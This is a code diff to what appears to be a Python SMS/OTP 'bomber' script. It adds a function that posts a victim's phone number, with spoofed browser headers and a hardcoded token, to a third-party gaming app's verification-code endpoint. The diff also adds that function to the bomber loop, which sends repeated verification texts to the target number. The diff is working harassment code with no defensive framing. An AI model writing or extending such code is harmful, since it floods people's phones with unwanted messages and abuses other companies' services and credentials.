@@ -171,7 +171,30 @@ def otp4(number):
     except:
         field+=1
         return False
-        
+def otp5(number):
+    global limit, field
+    if str(number[0]) == "0":
+        number = number.replace(str(number[0]), "63")
+    elif str(number[0]) == "+":
+        number = number.replace("+", "")
+    else:
+        pass
+    url = "https://api.777pub.app:443/account/get_code"
+    header = {'Host': 'api.777pub.app','Connection': 'keep-alive','Content-Length': '83','User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser','Content-Type': 'application/x-www-form-urlencoded','Accept': '*/*','Origin': 'https://www.777pub.com','X-Requested-With': 'com.happythree.sevengames.pubshow','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.777pub.com/?f=UIHall','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9'}
+    body = {'token':'MTY3MTY2NTM2NH61idmEdMlptKqwbQ','tel':str(number),'type':0,'area':'63','language':'en-us'}
+    try:
+        web = requests.post(url, headers = header, data = body)
+        r = json.loads(web.text)
+        if r["code"] == 0:
+            limit+=1
+            return True
+        else:
+            field+=1
+            return False
+    except:
+        field+=1
+        return False
+
 def bomber(function):
     global limit, RUN, limit1, field, slp
     number = open("number.txt", "r").read()
@@ -197,7 +220,7 @@ def home():
     a.write(str(number))
     a.close()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
-    function = [otp, otp1, otp2, otp3, otp4]
+    function = [otp, otp1, otp2, otp3, otp4, otp5]
     limit1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mSleep")
     slp = pick()
